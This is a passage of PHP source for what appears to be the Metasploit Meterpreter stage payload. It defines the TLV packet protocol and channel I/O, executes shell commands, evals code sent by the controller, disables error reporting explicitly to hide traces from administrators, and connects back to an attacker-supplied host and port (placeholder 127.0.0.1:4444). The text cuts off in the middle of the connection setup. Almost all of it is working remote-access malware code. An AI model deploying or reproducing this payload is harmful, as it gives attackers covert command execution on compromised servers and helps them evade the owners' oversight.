#<?php

# global list of channels
if (!isset($GLOBALS['channels'])) {
    $GLOBALS['channels'] = array();
}

# global resource map.  This is how we know whether to use socket or stream
# functions on a channel.
if (!isset($GLOBALS['resource_type_map'])) {
    $GLOBALS['resource_type_map'] = array();
}

# global list of resources we need to watch in the main select loop
if (!isset($GLOBALS['readers'])) {
    $GLOBALS['readers'] = array();
}

function my_print($str) {
    #error_log($str);
    #print($str ."\n");
    #flush();
}

my_print("Evaling main meterpreter stage");

# Be very careful not to put a # anywhere that isn't a comment (e.g. inside a
# string) as the comment remover will completely break this payload

function dump_array($arr, $name=null) {
    if (is_null($name)) {
        my_print(sprintf("Array (%s)", count($arr)));
    } else {
        my_print(sprintf("$name (%s)", count($arr)));
    }
    foreach ($arr as $key => $val) {
        $foo = sprintf("    $key ($val)");
        my_print($foo);
    }
}
function dump_readers() {
    global $readers;
    dump_array($readers, 'Readers');
}
function dump_resource_map() {
    global $resource_type_map;
    dump_array($resource_type_map, 'Resource map');
}


# Doesn't exist before php 4.3
if (!function_exists("file_get_contents")) {
function file_get_contents($file) {
        $f = @fopen($file,"rb");
        $contents = false;
        if ($f) {
            do { $contents .= fgets($f); } while (!feof($f));
        }
        fclose($f);
        return $contents;
}
}

# Renamed in php 4.3
if (!function_exists('socket_set_option')) {
function socket_set_option($sock, $type, $opt, $value) {
    socket_setopt($sock, $type, $opt, $value);
}
}


#
# Constants
#
define("PACKET_TYPE_REQUEST",0);
define("PACKET_TYPE_RESPONSE",1);
define("PACKET_TYPE_PLAIN_REQUEST", 10);
define("PACKET_TYPE_PLAIN_RESPONSE", 11);

define("ERROR_SUCCESS",0);
# not defined in original C implementation
define("ERROR_FAILURE",1);

define("CHANNEL_CLASS_BUFFERED", 0);
define("CHANNEL_CLASS_STREAM",   1);
define("CHANNEL_CLASS_DATAGRAM", 2);
define("CHANNEL_CLASS_POOL",     3);

#
# TLV Meta Types
#
define("TLV_META_TYPE_NONE",       (   0   ));
define("TLV_META_TYPE_STRING",     (1 << 16));
define("TLV_META_TYPE_UINT",       (1 << 17));
define("TLV_META_TYPE_RAW",        (1 << 18));
define("TLV_META_TYPE_BOOL",       (1 << 19));
define("TLV_META_TYPE_COMPRESSED", (1 << 29));
define("TLV_META_TYPE_GROUP",      (1 << 30));
define("TLV_META_TYPE_COMPLEX",    (1 << 31));
# not defined in original
define("TLV_META_TYPE_MASK",    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16));

#
# TLV base starting points
#
define("TLV_RESERVED",   0);
define("TLV_EXTENSIONS", 20000);
define("TLV_USER",       40000);
define("TLV_TEMP",       60000);

#
# TLV Specific Types
#
define("TLV_TYPE_ANY",                 TLV_META_TYPE_NONE   |   0);
define("TLV_TYPE_METHOD",              TLV_META_TYPE_STRING |   1);
define("TLV_TYPE_REQUEST_ID",          TLV_META_TYPE_STRING |   2);
define("TLV_TYPE_EXCEPTION",           TLV_META_TYPE_GROUP  |   3);
define("TLV_TYPE_RESULT",              TLV_META_TYPE_UINT   |   4);

define("TLV_TYPE_STRING",              TLV_META_TYPE_STRING |  10);
define("TLV_TYPE_UINT",                TLV_META_TYPE_UINT   |  11);
define("TLV_TYPE_BOOL",                TLV_META_TYPE_BOOL   |  12);

define("TLV_TYPE_LENGTH",              TLV_META_TYPE_UINT   |  25);
define("TLV_TYPE_DATA",                TLV_META_TYPE_RAW    |  26);
define("TLV_TYPE_FLAGS",               TLV_META_TYPE_UINT   |  27);

define("TLV_TYPE_CHANNEL_ID",          TLV_META_TYPE_UINT   |  50);
define("TLV_TYPE_CHANNEL_TYPE",        TLV_META_TYPE_STRING |  51);
define("TLV_TYPE_CHANNEL_DATA",        TLV_META_TYPE_RAW    |  52);
define("TLV_TYPE_CHANNEL_DATA_GROUP",  TLV_META_TYPE_GROUP  |  53);
define("TLV_TYPE_CHANNEL_CLASS",       TLV_META_TYPE_UINT   |  54);

define("TLV_TYPE_SEEK_WHENCE",         TLV_META_TYPE_UINT   |  70);
define("TLV_TYPE_SEEK_OFFSET",         TLV_META_TYPE_UINT   |  71);
define("TLV_TYPE_SEEK_POS",            TLV_META_TYPE_UINT   |  72);

define("TLV_TYPE_EXCEPTION_CODE",      TLV_META_TYPE_UINT   | 300);
define("TLV_TYPE_EXCEPTION_STRING",    TLV_META_TYPE_STRING | 301);

define("TLV_TYPE_LIBRARY_PATH",        TLV_META_TYPE_STRING | 400);
define("TLV_TYPE_TARGET_PATH",         TLV_META_TYPE_STRING | 401);
define("TLV_TYPE_MIGRATE_PID",         TLV_META_TYPE_UINT   | 402);
define("TLV_TYPE_MIGRATE_LEN",         TLV_META_TYPE_UINT   | 403);

define("TLV_TYPE_CIPHER_NAME",         TLV_META_TYPE_STRING | 500);
define("TLV_TYPE_CIPHER_PARAMETERS",   TLV_META_TYPE_GROUP  | 501);

##
# General
##
define("TLV_TYPE_HANDLE",              TLV_META_TYPE_UINT    |  600);
define("TLV_TYPE_INHERIT",             TLV_META_TYPE_BOOL    |  601);
define("TLV_TYPE_PROCESS_HANDLE",      TLV_META_TYPE_UINT    |  630);
define("TLV_TYPE_THREAD_HANDLE",       TLV_META_TYPE_UINT    |  631);

##
# Fs
##
define("TLV_TYPE_DIRECTORY_PATH",      TLV_META_TYPE_STRING  | 1200);
define("TLV_TYPE_FILE_NAME",           TLV_META_TYPE_STRING  | 1201);
define("TLV_TYPE_FILE_PATH",           TLV_META_TYPE_STRING  | 1202);
define("TLV_TYPE_FILE_MODE",           TLV_META_TYPE_STRING  | 1203);
define("TLV_TYPE_STAT_BUF",            TLV_META_TYPE_COMPLEX | 1220);

##
# Net
##
define("TLV_TYPE_HOST_NAME",           TLV_META_TYPE_STRING  | 1400);
define("TLV_TYPE_PORT",                TLV_META_TYPE_UINT    | 1401);

define("TLV_TYPE_SUBNET",              TLV_META_TYPE_RAW     | 1420);
define("TLV_TYPE_NETMASK",             TLV_META_TYPE_RAW     | 1421);
define("TLV_TYPE_GATEWAY",             TLV_META_TYPE_RAW     | 1422);
define("TLV_TYPE_NETWORK_ROUTE",       TLV_META_TYPE_GROUP   | 1423);

define("TLV_TYPE_IP",                  TLV_META_TYPE_RAW     | 1430);
define("TLV_TYPE_MAC_ADDRESS",         TLV_META_TYPE_RAW     | 1431);
define("TLV_TYPE_MAC_NAME",            TLV_META_TYPE_STRING  | 1432);
define("TLV_TYPE_NETWORK_INTERFACE",   TLV_META_TYPE_GROUP   | 1433);

define("TLV_TYPE_SUBNET_STRING",       TLV_META_TYPE_STRING  | 1440);
define("TLV_TYPE_NETMASK_STRING",      TLV_META_TYPE_STRING  | 1441);
define("TLV_TYPE_GATEWAY_STRING",      TLV_META_TYPE_STRING  | 1442);

# Socket
define("TLV_TYPE_PEER_HOST",           TLV_META_TYPE_STRING  | 1500);
define("TLV_TYPE_PEER_PORT",           TLV_META_TYPE_UINT    | 1501);
define("TLV_TYPE_LOCAL_HOST",          TLV_META_TYPE_STRING  | 1502);
define("TLV_TYPE_LOCAL_PORT",          TLV_META_TYPE_UINT    | 1503);
define("TLV_TYPE_CONNECT_RETRIES",     TLV_META_TYPE_UINT    | 1504);

define("TLV_TYPE_SHUTDOWN_HOW",        TLV_META_TYPE_UINT    | 1530);

##
# Sys
##
define("PROCESS_EXECUTE_FLAG_HIDDEN", (1 << 0));
define("PROCESS_EXECUTE_FLAG_CHANNELIZED", (1 << 1));
define("PROCESS_EXECUTE_FLAG_SUSPENDED", (1 << 2));
define("PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN", (1 << 3));

# Registry
define("TLV_TYPE_HKEY",                TLV_META_TYPE_UINT    | 1000);
define("TLV_TYPE_ROOT_KEY",            TLV_TYPE_HKEY);
define("TLV_TYPE_BASE_KEY",            TLV_META_TYPE_STRING  | 1001);
define("TLV_TYPE_PERMISSION",          TLV_META_TYPE_UINT    | 1002);
define("TLV_TYPE_KEY_NAME",            TLV_META_TYPE_STRING  | 1003);
define("TLV_TYPE_VALUE_NAME",          TLV_META_TYPE_STRING  | 1010);
define("TLV_TYPE_VALUE_TYPE",          TLV_META_TYPE_UINT    | 1011);
define("TLV_TYPE_VALUE_DATA",          TLV_META_TYPE_RAW     | 1012);

# Config
define("TLV_TYPE_COMPUTER_NAME",       TLV_META_TYPE_STRING  | 1040);
define("TLV_TYPE_OS_NAME",             TLV_META_TYPE_STRING  | 1041);
define("TLV_TYPE_USER_NAME",           TLV_META_TYPE_STRING  | 1042);

define("DELETE_KEY_FLAG_RECURSIVE", (1 << 0));

# Process
define("TLV_TYPE_BASE_ADDRESS",        TLV_META_TYPE_UINT    | 2000);
define("TLV_TYPE_ALLOCATION_TYPE",     TLV_META_TYPE_UINT    | 2001);
define("TLV_TYPE_PROTECTION",          TLV_META_TYPE_UINT    | 2002);
define("TLV_TYPE_PROCESS_PERMS",       TLV_META_TYPE_UINT    | 2003);
define("TLV_TYPE_PROCESS_MEMORY",      TLV_META_TYPE_RAW     | 2004);
define("TLV_TYPE_ALLOC_BASE_ADDRESS",  TLV_META_TYPE_UINT    | 2005);
define("TLV_TYPE_MEMORY_STATE",        TLV_META_TYPE_UINT    | 2006);
define("TLV_TYPE_MEMORY_TYPE",         TLV_META_TYPE_UINT    | 2007);
define("TLV_TYPE_ALLOC_PROTECTION",    TLV_META_TYPE_UINT    | 2008);
define("TLV_TYPE_PID",                 TLV_META_TYPE_UINT    | 2300);
define("TLV_TYPE_PROCESS_NAME",        TLV_META_TYPE_STRING  | 2301);
define("TLV_TYPE_PROCESS_PATH",        TLV_META_TYPE_STRING  | 2302);
define("TLV_TYPE_PROCESS_GROUP",       TLV_META_TYPE_GROUP   | 2303);
define("TLV_TYPE_PROCESS_FLAGS",       TLV_META_TYPE_UINT    | 2304);
define("TLV_TYPE_PROCESS_ARGUMENTS",   TLV_META_TYPE_STRING  | 2305);

define("TLV_TYPE_IMAGE_FILE",          TLV_META_TYPE_STRING  | 2400);
define("TLV_TYPE_IMAGE_FILE_PATH",     TLV_META_TYPE_STRING  | 2401);
define("TLV_TYPE_PROCEDURE_NAME",      TLV_META_TYPE_STRING  | 2402);
define("TLV_TYPE_PROCEDURE_ADDRESS",   TLV_META_TYPE_UINT    | 2403);
define("TLV_TYPE_IMAGE_BASE",          TLV_META_TYPE_UINT    | 2404);
define("TLV_TYPE_IMAGE_GROUP",         TLV_META_TYPE_GROUP   | 2405);
define("TLV_TYPE_IMAGE_NAME",          TLV_META_TYPE_STRING  | 2406);

define("TLV_TYPE_THREAD_ID",           TLV_META_TYPE_UINT    | 2500);
define("TLV_TYPE_THREAD_PERMS",        TLV_META_TYPE_UINT    | 2502);
define("TLV_TYPE_EXIT_CODE",           TLV_META_TYPE_UINT    | 2510);
define("TLV_TYPE_ENTRY_POINT",         TLV_META_TYPE_UINT    | 2511);
define("TLV_TYPE_ENTRY_PARAMETER",     TLV_META_TYPE_UINT    | 2512);
define("TLV_TYPE_CREATION_FLAGS",      TLV_META_TYPE_UINT    | 2513);

define("TLV_TYPE_REGISTER_NAME",       TLV_META_TYPE_STRING  | 2540);
define("TLV_TYPE_REGISTER_SIZE",       TLV_META_TYPE_UINT    | 2541);
define("TLV_TYPE_REGISTER_VALUE_32",   TLV_META_TYPE_UINT    | 2542);
define("TLV_TYPE_REGISTER",            TLV_META_TYPE_GROUP   | 2550);

##
# Ui
##
define("TLV_TYPE_IDLE_TIME",           TLV_META_TYPE_UINT    | 3000);
define("TLV_TYPE_KEYS_DUMP",           TLV_META_TYPE_STRING  | 3001);
define("TLV_TYPE_DESKTOP",             TLV_META_TYPE_STRING  | 3002);

##
# Event Log
##
define("TLV_TYPE_EVENT_SOURCENAME",    TLV_META_TYPE_STRING  | 4000);
define("TLV_TYPE_EVENT_HANDLE",        TLV_META_TYPE_UINT    | 4001);
define("TLV_TYPE_EVENT_NUMRECORDS",    TLV_META_TYPE_UINT    | 4002);

define("TLV_TYPE_EVENT_READFLAGS",     TLV_META_TYPE_UINT    | 4003);
define("TLV_TYPE_EVENT_RECORDOFFSET",  TLV_META_TYPE_UINT    | 4004);

define("TLV_TYPE_EVENT_RECORDNUMBER",  TLV_META_TYPE_UINT    | 4006);
define("TLV_TYPE_EVENT_TIMEGENERATED", TLV_META_TYPE_UINT    | 4007);
define("TLV_TYPE_EVENT_TIMEWRITTEN",   TLV_META_TYPE_UINT    | 4008);
define("TLV_TYPE_EVENT_ID",            TLV_META_TYPE_UINT    | 4009);
define("TLV_TYPE_EVENT_TYPE",          TLV_META_TYPE_UINT    | 4010);
define("TLV_TYPE_EVENT_CATEGORY",      TLV_META_TYPE_UINT    | 4011);
define("TLV_TYPE_EVENT_STRING",        TLV_META_TYPE_STRING  | 4012);
define("TLV_TYPE_EVENT_DATA",          TLV_META_TYPE_RAW     | 4013);

##
# Power
##
define("TLV_TYPE_POWER_FLAGS",         TLV_META_TYPE_UINT    | 4100);
define("TLV_TYPE_POWER_REASON",        TLV_META_TYPE_UINT    | 4101);

function my_cmd($cmd) {
    return shell_exec($cmd);
}

function is_windows() {
    return (strtoupper(substr(PHP_OS,0,3)) == "WIN");
}






##
# Worker functions
##

function core_channel_open($req, &$pkt) {
    $type_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_TYPE);

    my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do");

    # Doing it this way allows extensions to create new channel types without
    # needing to modify the core code.
    $handler = "channel_create_". $type_tlv['value'];
    if ($type_tlv['value'] && is_callable($handler)) {
        $ret = $handler($req, $pkt);
    } else {
        my_print("I don't know how to make a ". $type_tlv['value'] ." channel. =(");
        $ret = ERROR_FAILURE;
    }

    return $ret;
}

function core_channel_eof($req, &$pkt) {
    my_print("doing channel eof");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $c = get_channel_by_id($chan_tlv['value']);

    if ($c) {
        # XXX Doesn't work with sockets.
        if (@feof($c[1])) {
            packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1));
        } else {
            packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0));
        }
        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}

# Works for streams that work with fread
function core_channel_read($req, &$pkt) {
    my_print("doing channel read");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id = $chan_tlv['value'];
    $len = $len_tlv['value'];
    $data = channel_read($id, $len);
    if ($data === false) {
        $res = ERROR_FAILURE;
    } else {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
        $res = ERROR_SUCCESS;
    }
    return $res;
}

# Works for streams that work with fwrite
function core_channel_write($req, &$pkt) {
    my_print("doing channel write");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA);
    $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id = $chan_tlv['value'];
    $data = $data_tlv['value'];
    $len = $len_tlv['value'];

    $wrote = channel_write($id, $data, $len);
    if ($wrote === false) {
        return ERROR_FAILURE;
    } else {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, $wrote));
        return ERROR_SUCCESS;
    }
}

function core_channel_close($req, &$pkt) {
    global $processes;
    # XXX remove the closed channel from $readers
    my_print("doing channel close");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $id = $chan_tlv['value'];

    $c = get_channel_by_id($id);
    if ($c) {
        # We found a channel, close its stdin/stdout/stderr
        for($i = 0; $i < 3; $i++) {
            #my_print("closing channel fd $i, {$c[$i]}");
            if (array_key_exists($i, $c) && is_resource($c[$i])) {
                close($c[$i]);
            }
        }
        if (array_key_exists($id, $processes)) {
            @proc_close($processes[$id]);
            unset($processes[$id]);
        }
        return ERROR_SUCCESS;
    }

    return ERROR_FAILURE;
}

function core_channel_interact($req, &$pkt) {
    global $readers;

    my_print("doing channel interact");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $id = $chan_tlv['value'];

    # True means start interacting, False means stop
    $toggle_tlv = packet_get_tlv($req, TLV_TYPE_BOOL);

    $c = get_channel_by_id($id);
    if ($c) {
        if ($toggle_tlv['value']) {
            # Start interacting.  If we're already interacting with this
            # channel, it's an error and we should return failure.
            if (!in_array($c[1], $readers)) {
                # stdout
                add_reader($c[1]);
                # stderr, don't care if it fails
                if (array_key_exists(2, $c) && $c[1] != $c[2]) {
                    add_reader($c[2]);
                }
                $ret = ERROR_SUCCESS;
            } else {
                # Already interacting
                $ret = ERROR_FAILURE;
            }
        } else {
            # Stop interacting.  If we're not interacting yet with this
            # channel, it's an error and we should return failure.
            if (in_array($c[1], $readers)) {
                remove_reader($c[1]); # stdout
                remove_reader($c[2]); # stderr
                $ret = ERROR_SUCCESS;
            } else {
                # Not interacting
                $ret = ERROR_FAILURE;
            }
        }
    } else {
        # Not a valid channel
        $ret = ERROR_FAILURE;
    }
    return $ret;
}

# zlib support is not compiled in by default, so this makes sure the library
# isn't compressed before eval'ing it
# TODO: check for zlib support and decompress if possible
function core_loadlib($req, &$pkt) {
    my_print("doing core_loadlib (no-op)");
    $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
	if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
		return ERROR_FAILURE;
	} else {
		eval($data_tlv['value']);
		return ERROR_SUCCESS;
	}
}






##
# Channel Helper Functions
##
$channels = array();

function get_channel_id_from_resource($resource) {
    global $channels;
    #my_print("Looking up channel from resource $resource");
    for ($i = 0; $i < count($channels); $i++) {
        if (in_array($resource, $channels[$i])) {
            #my_print("Found channel id $i");
            return $i;
        }
    }
    return false;
}

function get_channel_by_id($chan_id) {
    global $channels;
    #my_print("Looking up channel id $chan_id");
    if (array_key_exists($chan_id, $channels)) {
        return $channels[$chan_id];
    } else {
        return false;
    }
}
# Write data to the channel's stdin
function channel_write($chan_id, $data) {
    $c = get_channel_by_id($chan_id);
    if ($c && is_resource($c[0])) {
        return write($c[0], $data);
    } else {
        return false;
    }
}
# Read from the channel's stdout
function channel_read($chan_id, $len) {
    $c = get_channel_by_id($chan_id);
    if ($c && is_resource($c[1])) {
        return read($c[1], $len);
    } else {
        return false;
    }
}




##
# TLV Helper Functions
##

function handle_dead_resource_channel($resource) {
    $cid = get_channel_id_from_resource($resource);
    my_print("Handling dead resource: {$resource}");
    close($resource);
    $pkt = pack("N", PACKET_TYPE_REQUEST);

    packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_close'));
    # XXX Make this random
    $req_id = str_repeat("A",32);
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, $req_id));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));

    # Add the length to the beginning of the packet
    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
    return $pkt;
}
function handle_resource_read_channel($resource, $data) {
    $cid = get_channel_id_from_resource($resource);
    my_print("Handling data from $resource: {$data}");
    $pkt = pack("N", PACKET_TYPE_REQUEST);

    packet_add_tlv($pkt, create_tlv(TLV_TYPE_METHOD, 'core_channel_write'));
    # XXX Make this random
    $req_id = str_repeat("A",32);
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_REQUEST_ID, $req_id));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $cid));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, strlen($data)));

    # Add the length to the beginning of the packet
    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
    return $pkt;
}

function create_response($req) {
    $pkt = pack("N", PACKET_TYPE_RESPONSE);

    $method_tlv = packet_get_tlv($req, TLV_TYPE_METHOD);
    #my_print("method is {$method_tlv['value']}");
    packet_add_tlv($pkt, $method_tlv);

    $reqid_tlv = packet_get_tlv($req, TLV_TYPE_REQUEST_ID);
    packet_add_tlv($pkt, $reqid_tlv);

    if (is_callable($method_tlv['value'])) {
        $result = $method_tlv['value']($req, $pkt);
    } else {
        my_print("Got a request for something I don't know how to handle (". $method_tlv['value'] ."), returning failure");
        $result = ERROR_FAILURE;
    }

    packet_add_tlv($pkt, create_tlv(TLV_TYPE_RESULT, $result));
    # Add the length to the beginning of the packet
    $pkt = pack("N", strlen($pkt) + 4) . $pkt;
    return $pkt;
}

function create_tlv($type, $val) {
    return array( 'type' => $type, 'value' => $val );
}

function tlv_pack($tlv) {
    $ret = "";
    #my_print("Creating a tlv of type: {$tlv['type']}");
    if (($tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
        $ret = pack("NNa*", 8 + strlen($tlv['value'])+1, $tlv['type'], $tlv['value'] . "\0");
    }
    elseif (($tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
        $ret = pack("NNN", 8 + 4, $tlv['type'], $tlv['value']);
    }
    elseif (($tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
        # PHP's pack appears to be busted for chars,
        $ret = pack("NN", 8 + 1, $tlv['type']);
        $ret .= $tlv['value'] ? "\x01" : "\x00";
    }
    elseif (($tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    }
    elseif (($tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP) {
        # treat groups the same as raw
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    }
    elseif (($tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX) {
        # treat complex the same as raw
        $ret = pack("NN", 8 + strlen($tlv['value']), $tlv['type']) . $tlv['value'];
    }
    else {
        my_print("Don't know how to make a tlv of type ". $tlv['type'] .  " (meta type ". sprintf("%08x", $tlv['type'] & TLV_META_TYPE_MASK) ."), wtf");
    }
    return $ret;
}

function packet_add_tlv(&$pkt, $tlv) {
    $pkt .= tlv_pack($tlv);
}

function packet_get_tlv($pkt, $type) {
    #my_print("Looking for a tlv of type $type");
    # Start at offset 8 to skip past the packet header
    $offset = 8;
    while ($offset < strlen($pkt)) {
        $tlv = unpack("Nlen/Ntype", substr($pkt, $offset, 8));
        #my_print("len: {$tlv['len']}, type: {$tlv['type']}");
        if ($type == ($tlv['type'] & ~TLV_META_TYPE_COMPRESSED)) {
            #my_print("Found one at offset $offset");
            if (($type & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING) {
                $tlv = unpack("Nlen/Ntype/a*value", substr($pkt, $offset, $tlv['len']));
            }
            elseif (($type & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT) {
                $tlv = unpack("Nlen/Ntype/Nvalue", substr($pkt, $offset, $tlv['len']));
            }
            elseif (($type & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL) {
                $tlv = unpack("Nlen/Ntype/cvalue", substr($pkt, $offset, $tlv['len']));
            }
            elseif (($type & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW) {
                $tlv = unpack("Nlen/Ntype", substr($pkt, $offset, 8));
                $tlv['value'] = substr($pkt, $offset+8, $tlv['len']-8);
            }
            else {
                my_print("Wtf type is this? $type");
                $tlv = null;
            }
            return $tlv;
        }
        $offset += $tlv['len'];
    }
    #my_print("Didn't find one, wtf");
    return false;
}


##
# Functions for genericizing the stream/socket conundrum
##


function register_socket($sock) {
    global $resource_type_map;
    my_print("Registering socket $sock");
    $resource_type_map[(int)$sock] = 'socket';
}

function register_stream($stream) {
    global $resource_type_map;
    my_print("Registering stream $stream");
    $resource_type_map[(int)$stream] = 'stream';
}

function connect($ipaddr, $port) {
    my_print("Doing connect($ipaddr, $port)");
    $sock = false;
    # Prefer the stream versions so we don't have to use both select functions
    # unnecessarily, but fall back to socket_create if they aren't available.
    if (is_callable('stream_socket_client')) {
        my_print("stream_socket_client");
        $sock = stream_socket_client("tcp://{$ipaddr}:{$port}");
        if (!$sock) { return false; }
        register_stream($sock);
    } else
    if (is_callable('fsockopen')) {
        my_print("fsockopen");
        $sock = fsockopen($ipaddr,$port);
        if (!$sock) { return false; }
        register_stream($sock);
    } elseif (is_callable('socket_create')) {
        my_print("socket_create");
        $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = socket_connect($sock, $ipaddr, $port);
        if (!$res) { return false; }
        register_socket($sock);
    }

    return $sock;
}

function close($resource) {
    my_print("Closing resource $resource");
    global $readers, $resource_type_map;
    remove_reader($resource);
    switch (get_rtype($resource)) {
    case 'socket': return socket_close($resource); break;
    case 'stream': return fclose($resource); break;
    }
    # Every resource should be in the resource type map, but check anyway
    if (array_key_exists((int)$resource, $resource_type_map)) {
        my_print("Removing $resource from resource_type_map");
        unset($resource_type_map[(int)$resource]);
    }
}

function read($resource, $len=null) {
    # Max packet length is magic.  If we're reading a pipe that has data but
    # isn't going to generate any more without some input, then reading less
    # than all bytes in the buffer or 8192 bytes, the next read will never
    # return.
    if (is_null($len)) { $len = 8192; }
    my_print(sprintf("Reading from $resource which is a %s", get_rtype($resource)));
    $buff = '';
    switch (get_rtype($resource)) {
    case 'socket': $buff = socket_read($resource, $len, PHP_BINARY_READ); break;
    case 'stream': $buff = fread($resource, $len); break;
    default: my_print("Wtf don't know how to read from resource $resource"); break;
    }
    my_print(sprintf("Read %d bytes", strlen($buff)));
    return $buff;
}

function write($resource, $buff, $len=0) {
    if ($len == 0) { $len = strlen($buff); }
    my_print(sprintf("Writing $len bytes to $resource which is a %s", get_rtype($resource)));
    $count = false;
    switch (get_rtype($resource)) {
    case 'socket': $count = socket_write($resource, $buff, $len); break;
    case 'stream': $count = fwrite($resource, $buff, $len); break;
    default: my_print("Wtf don't know how to write to resource $resource"); break;
    }
    my_print("Wrote $count bytes");
    return $count;
}

function get_rtype($resource) {
    global $resource_type_map;
    if (array_key_exists((int)$resource, $resource_type_map)) {
        return $resource_type_map[(int)$resource];
    }
    return false;
}

function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
    $streams_r = array();
    $streams_w = array();
    $streams_e = array();

    $sockets_r = array();
    $sockets_w = array();
    $sockets_e = array();

    if ($r) {
        foreach ($r as $resource) {
            switch (get_rtype($resource)) {
            case 'socket': $sockets_r[] = $resource; break;
            case 'stream': $streams_r[] = $resource; break;
            default: my_print("Unknown resource type"); break;
            }
        }
    }
    if ($w) {
        foreach ($w as $resource) {
            switch (get_rtype($resource)) {
            case 'socket': $sockets_w[] = $resource; break;
            case 'stream': $streams_w[] = $resource; break;
            default: my_print("Unknown resource type"); break;
            }
        }
    }
    if ($e) {
        foreach ($e as $resource) {
            switch (get_rtype($resource)) {
            case 'socket': $sockets_e[] = $resource; break;
            case 'stream': $streams_e[] = $resource; break;
            default: my_print("Unknown resource type"); break;
            }
        }
    }

    $n_sockets = count($sockets_r) + count($sockets_w) + count($sockets_e);
    $n_streams = count($streams_r) + count($streams_w) + count($streams_e);
    #my_print("Selecting $n_sockets sockets and $n_streams streams with timeout $tv_sec.$tv_usec");
    $r = array();
    $w = array();
    $e = array();

    # Workaround for some versions of PHP that throw an error and bail out if
    # select is given an empty array
    if (count($sockets_r)==0) { $sockets_r = null; }
    if (count($sockets_w)==0) { $sockets_w = null; }
    if (count($sockets_e)==0) { $sockets_e = null; }
    if (count($streams_r)==0) { $streams_r = null; }
    if (count($streams_w)==0) { $streams_w = null; }
    if (count($streams_e)==0) { $streams_e = null; }

    $count = 0;
    if ($n_sockets > 0) {
        $res = socket_select($sockets_r, $sockets_w, $sockets_e, $tv_sec, $tv_usec);
        if (false === $res) { return false; }
        if (is_array($r) && is_array($sockets_r)) { $r = array_merge($r, $sockets_r); }
        if (is_array($w) && is_array($sockets_w)) { $w = array_merge($w, $sockets_w); }
        if (is_array($e) && is_array($sockets_e)) { $e = array_merge($e, $sockets_e); }
        $count += $res;
    }
    if ($n_streams > 0) {
        $res = stream_select($streams_r, $streams_w, $streams_e, $tv_sec, $tv_usec);
        if (false === $res) { return false; }
        if (is_array($r) && is_array($streams_r)) { $r = array_merge($r, $streams_r); }
        if (is_array($w) && is_array($streams_w)) { $w = array_merge($w, $streams_w); }
        if (is_array($e) && is_array($streams_e)) { $e = array_merge($e, $streams_e); }
        $count += $res;
    }
    #my_print(sprintf("total: $count, Modified counts: r=%s w=%s e=%s", count($r), count($w), count($e)));
    return $count;
}

function add_reader($resource) {
    global $readers;
    if (is_resource($resource) && !in_array($resource, $readers)) {
        $readers[] = $resource;
    }
}

function remove_reader($resource) {
    global $readers;
    if (in_array($resource, $readers)) {
        foreach ($readers as $key => $r) {
            if ($r == $resource) {
                unset($readers[$key]);
            }
        }
    }
}


##
# Main stuff
##

ob_implicit_flush();

# Turn off error reporting so we don't leave any ugly logs.  Why make an
# administrator's job easier if we don't have to?  =)
error_reporting(0);
#error_reporting(E_ALL);

@ignore_user_abort(true);
# Has no effect in safe mode, but try anyway
@set_time_limit(0);


# If we don't have a socket we're standalone, setup the connection here.
# Otherwise, this is a staged payload, don't bother connecting
if (!isset($msgsock)) {
    # The payload handler overwrites this with the correct LHOST before sending
    # it to the victim.
    $ipaddr = '127.0.0.1';
    $port = 4444;
    if (FALSE !== strpos($ipaddr,":")) {
        # ipv6 requires brackets around the address
        $ipaddr = "[".$ipaddr."]";
    }
    $msgsock = connect($ipaddr, $port);
    if (!$msgsock) { die(); }
} else {
    switch ($msgsock_type) {
    case 'socket':
        register_socket($msgsock);
        break;
    case 'stream': 
        # fall through
    default:
